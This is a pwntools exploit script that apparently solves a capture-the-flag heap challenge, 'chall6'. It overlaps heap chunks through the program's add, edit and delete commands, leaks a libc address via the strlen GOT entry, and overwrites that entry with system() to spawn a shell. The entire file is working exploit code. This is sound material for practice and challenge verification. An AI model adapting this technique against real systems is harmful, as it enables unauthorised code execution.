#!/usr/bin/env python3
from pwn import *
import sys

target_elf = ELF('../bin/chall6')

HOST  = ''
PORT  = 40006

NUM_ATTEMPTS = 5

if len(sys.argv) > 1:
	HOST  = sys.argv[1]

if len(sys.argv) > 2:
	PORT = sys.argv[2]

def get_strlen_avx2(elf):
	"""Start from strlen(), find the first address loaded into rdx which _should_ be __strlen_avx2()"""
	strlen_offset = elf.symbols['strlen']
	for line in elf.disasm(strlen_offset, 200).split('\n'):
		line = ' '.join(line.split())
		if 'lea rdx' in line:
			return int(line.split(' # ', 1)[1], 16)
	return False

def add(io, name, desc, alias=''):
	cmd = b'add'
	if alias:
		cmd += b' '+alias.encode('ascii')

	io.sendline(cmd)
	io.recvuntil(b'player: ')
	io.sendline(name)
	io.recvuntil(b'desc: ')
	io.sendline(desc)

	io.recvuntil(' > ')

def edit(io, alias, name, desc, score):
	io.sendline(b'edit '+alias.encode('ascii'))
	io.recvuntil(b'player: ')
	io.sendline(name.encode('ascii'))
	io.recvuntil(b'desc: ')
	io.sendline(desc)
	io.recvuntil(b'score: ')
	io.sendline(str(score).encode('ascii'))

	io.recvuntil(b' > ')

def delete(io, alias):
	io.sendline(b'del '+alias.encode('ascii'))
	io.recvuntil(b' > ')

def exploit_attempt():
	try:
		if len(HOST) > 0:
			io = remote(HOST, PORT, level='warn')
			target_libc = ELF('../bin/libc.so.6')
		else:
			io = target_elf.process(level='warn')
			target_libc = target_elf.libc

		GOT   = target_elf.symbols['got.strlen'] # the address of strlen in GOT
		LIBC  = get_strlen_avx2(target_libc) # distance from __strlen_avx2() leak to libc base
		SYS   = target_libc.symbols['system'] # offset from libc base to system()

		# mmm ansi
		sys.stdout.write(io.recvuntil(b'stuff:')[:-16])

		# step 1: make sure the chunk we free is not bordering the top or bottom chunk
		add(io, 'A'*46, '0'*31, 'aa')
		add(io, 'B'*46, '1'*31, 'bb')
		add(io, 'C'*46, '2'*31, 'cc')
		add(io, 'D'*46, '3'*31, 'dd')

		# step 2: free the third struct and string
		delete(io, 'cc')

		# step 3: edit the second string so it ends up where the third struct was
		edit(io, 'bb', 'B'*46, b'x'*56 + p64(GOT), 234)

		# step 4: leak addresses
		io.sendline(b'show cc')
		io.recvuntil(b'desc: ')

		leak = io.recvline().strip()
		func = u64(leak + b'\x00\x00')
		libc = func - LIBC
		log.info('Func: 0x%012x' % func)
		log.info('Libc: 0x%012x' % libc)

		# step 5: overwrite strlen() pointer in GOT with system()
		edit(io, 'cc', 'C'*46, p64(libc + SYS), 234)

		# step 6: pop shell
		io.sendline(b'add')
		io.recvuntil(b': ')
		io.sendline(b'/bin/sh')

		io.sendline(b'id')
		id_result = io.recvline()
		if b'uid=' in id_result:
			log.success('shell: %s', id_result.decode('ascii').strip())
			if not os.environ.get('HEALTH_CHECK', False):
				io.interactive()
			return True
		else:
			log.failure('Error: %s', id_result)
	except EOFError as e:
		log.failure('Fail: EOF')
	except Exception as e:
		log.failure('Error: %s: %s', type(e), str(e))
	finally:
		io.close()
	return False

if __name__ == '__main__':
	for _ in range(NUM_ATTEMPTS):
		if exploit_attempt():
			sys.exit(0)
		sleep(0.1)
	sys.exit(1)